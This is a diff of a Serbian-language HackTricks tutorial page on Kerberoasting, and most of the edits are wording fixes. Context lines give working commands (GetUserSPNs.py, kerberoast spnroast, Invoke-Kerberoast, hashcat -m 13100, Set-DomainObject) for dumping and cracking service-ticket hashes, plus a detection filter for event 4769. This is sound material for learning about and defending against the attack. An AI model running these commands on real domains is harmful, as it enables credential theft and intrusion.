@@ -1,6 +1,6 @@
 # Kerberoast
 
-<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
 Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da biste lako izgradili i **automatizovali radne tokove** pokretane najnaprednijim alatima zajednice na svetu.\
@@ -14,31 +14,31 @@ Pristupite danas:
 
 Drugi načini podrške HackTricks-u:
 
-* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
+* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Podelite svoje hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
 
 ## Kerberoast
 
-Kerberoasting se fokusira na sticanje **TGS karata**, posebno onih koje se odnose na servise koji funkcionišu pod **korisničkim nalozima** u **Active Directory (AD)**, isključujući **računarske naloge**. Enkripcija ovih karata koristi ključeve koji potiču od **korisničkih lozinki**, omogućavajući mogućnost **offline pucanja lozinki**. Korišćenje korisničkog naloga kao servisa naznačeno je nepraznim svojstvom **"ServicePrincipalName"**.
+Kerberoasting se fokusira na sticanje **TGS karata**, posebno onih koje se odnose na servise koji funkcionišu pod **korisničkim nalozima** u **Active Directory (AD)**, isključujući **računarske naloge**. Enkripcija ovih karata koristi ključeve koji potiču od **korisničkih lozinki**, omogućavajući mogućnost **offline pucanja kredencijala**. Korišćenje korisničkog naloga kao servisa naznačeno je nepopunjenim svojstvom **"ServicePrincipalName"**.
 
-Za izvođenje **Kerberoasting-a**, neophodan je domenski nalog sposoban za zahtevanje **TGS karata**; međutim, ovaj proces ne zahteva **posebne privilegije**, što ga čini dostupnim svima sa **validnim domenskim pristupnicama**.
+Za izvođenje **Kerberoasting-a**, neophodan je domenski nalog sposoban za zahtevanje **TGS karata**; međutim, ovaj proces ne zahteva **posebne privilegije**, čineći ga dostupnim svima sa **validnim domenskim kredencijalima**.
 
 ### Ključne tačke:
 
 * **Kerberoasting** cilja **TGS karte** za **servise sa korisničkim nalozima** unutar **AD**.
-* Karte enkriptovane ključevima od **korisničkih lozinki** mogu se **pucati offline**.
+* Karte enkriptovane ključevima iz **korisničkih lozinki** mogu se **pucati offline**.
 * Servis je identifikovan svojstvom **ServicePrincipalName** koje nije null.
-* Nisu potrebne **posebne privilegije**, samo **validne domenske pristupnice**.
+* Nisu potrebne **posebne privilegije**, samo **validni domenski kredencijali**.
 
 ### **Napad**
 
 {% hint style="warning" %}
-**Kerberoasting alati** obično zahtevaju **`RC4 enkripciju`** prilikom izvođenja napada i pokretanja TGS-REQ zahteva. To je zato što je **RC4** [**slabija**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) i lakša za pucanje offline korišćenjem alata poput Hashcat-a od drugih enkripcionih algoritama poput AES-128 i AES-256.\
+**Kerberoasting alati** obično zahtevaju **`RC4 enkripciju`** prilikom izvođenja napada i pokretanja TGS-REQ zahteva. Ovo je zato što je **RC4** [**slabija**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) i lakša za pucanje offline korišćenjem alata poput Hashcat-a od drugih enkripcionih algoritama poput AES-128 i AES-256.\
 RC4 (tip 23) heševi počinju sa **`$krb5tgs$23$*`** dok AES-256 (tip 18) počinju sa **`$krb5tgs$18$*`**.
 {% endhint %}
 
@@ -53,7 +53,7 @@ GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERN
 kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
 kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
 ```
-Višefunkcionalni alati uključujući dump korisnika koji su podložni kerberoast napadu:
+Višefunkcionalni alati uključujući izlistavanje korisnika nad kojima se može primeniti tehnika Kerberoasting:
 ```bash
 # ADenum: https://github.com/SecuProject/ADenum
 adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
@@ -107,10 +107,10 @@ Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASC
 Kada se zatraži TGS, generiše se Windows događaj `4769 - Zatražen je Kerberos servisni tiket`.
 {% endhint %}
 
-<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Koristite [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) da biste lako izgradili i **automatizovali tokove rada** pokretane najnaprednijim alatima zajednice.\
+Koristite [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) da biste lako izgradili i **automatizovali radne tokove** pokretane najnaprednijim alatima zajednice.\
 Pristupite danas:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
@@ -123,7 +123,7 @@ hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 ```
 ### Upornost
 
-Ako imate **dovoljno dozvola** nad korisnikom, možete ga **učiniti podložnim za kerberoastanje**:
+Ako imate **dovoljno dozvola** nad korisnikom, možete ga **učiniti podložnim za kerberoast**:
 ```bash
 Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
 ```
@@ -136,12 +136,12 @@ Ako naiđete na ovu **grešku** sa Linuxa: **`Kerberos SessionError: KRB_AP_ERR_
 
 ### Otklanjanje
 
-Kerberoasting može biti sproveden sa visokim stepenom prikrivenosti ako je iskoristiv. Da bi se otkrila ova aktivnost, pažnja treba da se obrati na **Security Event ID 4769**, što ukazuje da je zatražen Kerberos tiket. Međutim, zbog visoke frekvencije ovog događaja, specifični filteri moraju biti primenjeni kako bi se izolovale sumnjive aktivnosti:
+Kerberoasting može biti sproveden sa visokim stepenom prikrivenosti ako je iskoristiv. Da bi se detektovala ova aktivnost, pažnja treba da bude usmerena na **Security Event ID 4769**, što ukazuje da je zatražen Kerberos tiket. Međutim, zbog visoke frekvencije ovog događaja, specifični filteri moraju biti primenjeni kako bi se izolovale sumnjive aktivnosti:
 
 * Ime servisa ne bi trebalo da bude **krbtgt**, jer je ovo normalan zahtev.
 * Imena servisa koja se završavaju sa **$** treba isključiti kako bi se izbegli računi mašina korišćeni za servise.
-* Zahtevi sa mašina treba da budu filtrirani isključivanjem imena naloga formatiranih kao **machine@domain**.
-* Razmotriti samo uspešne zahteve za tiket, identifikovane sa kodom greške **'0x0'**.
+* Zahtevi sa mašina treba filtrirati isključivanjem imena naloga formatiranih kao **machine@domain**.
+* Razmatraju se samo uspešni zahtevi za tiketima, identifikovani sa kodom greške **'0x0'**.
 * **Najvažnije**, tip enkripcije tiketa treba da bude **0x17**, što se često koristi u napadima Kerberoastinga.
 ```bash
 Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
@@ -155,7 +155,7 @@ Implementacijom ovih mera, organizacije mogu značajno smanjiti rizik povezan sa
 
 ## Kerberoast bez naloga domena
 
-U **septembru 2022.**, novi način iskorišćavanja sistema je otkriven od strane istraživača po imenu Charlie Clark, podeljen preko njegove platforme [exploit.ph](https://exploit.ph/). Ovaj metod omogućava sticanje **Servisnih karata (ST)** putem zahteva **KRB\_AS\_REQ**, što značajno ne zahteva kontrolu nad bilo kojim nalogom Active Directory-a. U osnovi, ako je princip postavljen na način da ne zahteva preautentikaciju - scenario sličan onome što je poznato u svetu sajber bezbednosti kao **AS-REP Roasting napad** - ova karakteristika može se iskoristiti za manipulaciju procesa zahteva. Konkretno, izmenom atributa **sname** unutar tela zahteva, sistem je prevaren da izda **ST** umesto standardne šifrovane karte za dodelu karata (TGT).
+U **septembru 2022.**, novi način iskorišćavanja sistema je otkriven od strane istraživača po imenu Charlie Clark, podeljen preko njegove platforme [exploit.ph](https://exploit.ph/). Ovaj metod omogućava sticanje **Servisnih karata (ST)** putem zahteva **KRB\_AS\_REQ**, što značajno ne zahteva kontrolu nad bilo kojim nalogom Active Directory-a. U osnovi, ako je princip postavljen na način da ne zahteva preautentikaciju - scenario sličan onome što je poznato u oblasti sajber bezbednosti kao **AS-REP Roasting napad** - ova karakteristika može se iskoristiti za manipulaciju procesa zahteva. Konkretno, izmenom atributa **sname** unutar tela zahteva, sistem je prevaren da izda **ST** umesto standardne šifrovane karte za dodelu karata (TGT).
 
 Tehnika je potpuno objašnjena u ovom članku: [Semperis blog post](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).
 
@@ -190,15 +190,15 @@ Drugi načini podrške HackTricks-u:
 * Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
-* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
+* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
 * **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
 
-<figure><img src="../../.gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>
 
 \
-Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da lako izgradite i **automatizujete radne tokove** pokretane najnaprednijim alatima zajednice.\
+Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da lako izgradite i **automatizujete radne tokove** pokretane najnaprednijim alatima zajednice na svetu.\
 Dobijte pristup danas:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
